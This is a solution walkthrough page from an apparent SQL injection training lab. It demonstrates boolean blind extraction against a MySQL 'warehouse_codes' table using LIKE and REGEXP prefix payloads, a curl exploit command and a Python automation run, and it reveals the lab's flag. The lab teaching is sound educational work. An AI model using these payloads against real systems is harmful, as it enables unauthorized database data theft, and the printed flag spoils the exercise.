<h4>Step 1: Identify a Valid In-Stock SKU</h4>
<p>
    Find a valid SKU that returns &ldquo;In stock&rdquo; to use as the boolean oracle baseline.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Baseline Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>SKU001<br>
        <span class="prompt">Response: </span><strong>In stock</strong><br><br>
        <span class="prompt">Input: </span>SKU004<br>
        <span class="prompt">Response: </span><strong>Out of stock / Not found</strong> (SKU004 exists but is not in stock)
    </div>
</div>

<h4>Step 2: Confirm the Boolean Oracle</h4>
<p>
    Verify that injected conditions change the response.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Confirm Boolean Oracle</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>SKU001' AND 1=1 -- -<br>
        <span class="prompt">Response: </span><strong>In stock</strong> (TRUE condition)<br><br>
        <span class="prompt">Input: </span>SKU001' AND 1=2 -- -<br>
        <span class="prompt">Response: </span><strong>Out of stock / Not found</strong> (FALSE condition)
    </div>
</div>

<h4>Step 3: Extract Using LIKE. Character by Character</h4>
<p>
    The <code>LIKE</code> operator with a trailing <code>%</code> wildcard matches prefixes.
    Build the flag one character at a time by extending the prefix.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. LIKE Prefix Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>SKU001' AND (SELECT code FROM warehouse_codes LIMIT 1) LIKE 'F%' -- -<br>
        <span class="prompt">Response: </span><strong>In stock</strong> (TRUE -- starts with 'F')<br><br>
        <span class="prompt">Input: </span>SKU001' AND (SELECT code FROM warehouse_codes LIMIT 1) LIKE 'FL%' -- -<br>
        <span class="prompt">Response: </span><strong>In stock</strong> (TRUE -- starts with 'FL')<br><br>
        <span class="prompt">Input: </span>SKU001' AND (SELECT code FROM warehouse_codes LIMIT 1) LIKE 'FLA%' -- -<br>
        <span class="prompt">Response: </span><strong>In stock</strong> (TRUE -- starts with 'FLA')<br><br>
        <span class="prompt">Input: </span>SKU001' AND (SELECT code FROM warehouse_codes LIMIT 1) LIKE 'FLAG%' -- -<br>
        <span class="prompt">Response: </span><strong>In stock</strong> (TRUE -- starts with 'FLAG')<br><br>
        <span class="prompt">Input: </span>SKU001' AND (SELECT code FROM warehouse_codes LIMIT 1) LIKE 'FLAG{%' -- -<br>
        <span class="prompt">Response: </span><strong>In stock</strong> (TRUE -- starts with 'FLAG{')<br><br>
        <span class="prompt">Input: </span>SKU001' AND (SELECT code FROM warehouse_codes LIMIT 1) LIKE 'FLAG{r%' -- -<br>
        <span class="prompt">Response: </span><strong>In stock</strong> (TRUE -- starts with 'FLAG{r')<br><br>
        <span class="prompt">Input: </span>SKU001' AND (SELECT code FROM warehouse_codes LIMIT 1) LIKE 'FLAG{r3%' -- -<br>
        <span class="prompt">Response: </span><strong>In stock</strong> (TRUE -- starts with 'FLAG{r3')
    </div>
</div>

<p>
    <strong>Important:</strong> LIKE is case-insensitive by default in MySQL. Since the flag
    uses only lowercase, digits, and underscores inside the braces, this is not an issue here.
    If case sensitivity matters, use <code>LIKE BINARY 'prefix%'</code>.
</p>

<p>
    <strong>Special characters:</strong> The <code>{</code> and <code>}</code> characters
    have no special meaning in LIKE patterns (only <code>%</code> and <code>_</code> are wildcards).
    If you need to match a literal <code>_</code>, escape it: <code>LIKE 'FLAG{r3g3xp\_l%'</code>.
    However, since <code>_</code> matches any single character, it will still work as a
    progressive narrowing without escaping.
</p>

<h4>Step 4: Extract Using REGEXP</h4>
<p>
    <code>REGEXP</code> offers more powerful pattern matching. Use <code>^</code> to anchor
    to the start and build the pattern progressively.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. REGEXP Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>SKU001' AND (SELECT code FROM warehouse_codes LIMIT 1) REGEXP '^F' -- -<br>
        <span class="prompt">Response: </span><strong>In stock</strong> (TRUE)<br><br>
        <span class="prompt">Input: </span>SKU001' AND (SELECT code FROM warehouse_codes LIMIT 1) REGEXP '^FLAG' -- -<br>
        <span class="prompt">Response: </span><strong>In stock</strong> (TRUE)<br><br>
        <span class="prompt">// Note: { can be escaped in REGEXP with a backslash</span><br>
        <span class="prompt">Input: </span>SKU001' AND (SELECT code FROM warehouse_codes LIMIT 1) REGEXP '^FLAG\{r3g3xp' -- -<br>
        <span class="prompt">Response: </span><strong>In stock</strong> (TRUE -- confirmed)<br><br>
        <span class="prompt">Input: </span>SKU001' AND (SELECT code FROM warehouse_codes LIMIT 1) REGEXP '^FLAG\{r3g3xp_l1k3' -- -<br>
        <span class="prompt">Response: </span><strong>In stock</strong> (TRUE -- confirmed)
    </div>
</div>

<h4>Step 5: Case Sensitivity with BINARY</h4>
<p>
    By default, REGEXP is case-insensitive in MySQL. If you need exact case matching,
    cast the value with <code>BINARY</code>:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Case-Sensitive REGEXP</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Case-insensitive (both work):</span><br>
        <span class="prompt">Input: </span>SKU001' AND (SELECT code FROM warehouse_codes LIMIT 1) REGEXP '^flag' -- -<br>
        <span class="prompt">Response: </span>In stock (TRUE -- matches case-insensitively)<br><br>
        <span class="prompt">// Case-sensitive with BINARY:</span><br>
        <span class="prompt">Input: </span>SKU001' AND (SELECT BINARY code FROM warehouse_codes LIMIT 1) REGEXP '^flag' -- -<br>
        <span class="prompt">Response: </span>Out of stock (FALSE -- 'FLAG' != 'flag')<br><br>
        <span class="prompt">Input: </span>SKU001' AND (SELECT BINARY code FROM warehouse_codes LIMIT 1) REGEXP '^FLAG' -- -<br>
        <span class="prompt">Response: </span><strong>In stock</strong> (TRUE -- exact case match)
    </div>
</div>

<h4>Step 6: Complete Extraction</h4>
<p>
    Continue building the prefix until you have the full flag. Using either LIKE or REGEXP:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Full Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">LIKE: </span>SKU001' AND (SELECT code FROM warehouse_codes LIMIT 1) LIKE 'FLAG{r3g3xp_l1k3_0r4cl3}' -- -<br>
        <span class="prompt">Response: </span><strong>In stock</strong> (TRUE -- exact match confirms the full flag)<br><br>
        <span class="prompt">Flag: </span><strong>FLAG{r3g3xp_l1k3_0r4cl3}</strong>
    </div>
</div>

<h4>Step 7: Submit the Warehouse Code</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{r3g3xp_l1k3_0r4cl3}</code>.
</p>

<h4>Step 8: Python Automation Script</h4>
<p>
    Automate the prefix-building process with this Python script that tests each
    character and builds the flag incrementally using LIKE:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 8. Python Automation (lab10_blind_like.py)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>python3 scripts/lab10_blind_like.py http://localhost/SQLi-Arena<br><br>
        <span class="prompt">[*] </span>Extracting flag via LIKE prefix matching...<br>
        <span class="prompt">&nbsp;&nbsp;[ 1] </span>F<br>
        <span class="prompt">&nbsp;&nbsp;[ 2] </span>FL<br>
        <span class="prompt">&nbsp;&nbsp;[ 3] </span>FLA<br>
        <span class="prompt">&nbsp;&nbsp;...</span><br>
        <span class="prompt">&nbsp;&nbsp;[24] </span>FLAG{r3g3xp_l1k3_0r4cl3}<br><br>
        <span class="prompt">[+] </span>Flag: FLAG{r3g3xp_l1k3_0r4cl3}
    </div>
</div>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Script Source: lab10_blind_like.py</span>
    </div>
    <div class="terminal-body"><pre style="margin:0;white-space:pre;overflow-x:auto;"><?php echo htmlspecialchars(file_get_contents(__DIR__ . '/scripts/lab10_blind_like.py')); ?></pre></div>
</div>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mysql/lab10" \<br> --data-urlencode "sku=SKU001' AND (SELECT code FROM warehouse_codes LIMIT 1) LIKE 'FLAG{r3g3xp_l1k3_0r4cl3}' -- -"
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> <code>LIKE</code> and <code>REGEXP</code> provide
    alternative approaches to boolean-based blind extraction. LIKE is simpler for prefix
    matching, while REGEXP offers full regex power for complex patterns. Both can be used
    to reconstruct hidden values character by character. Defense: use prepared statements
    and avoid leaking boolean signals through differing responses.
</div>
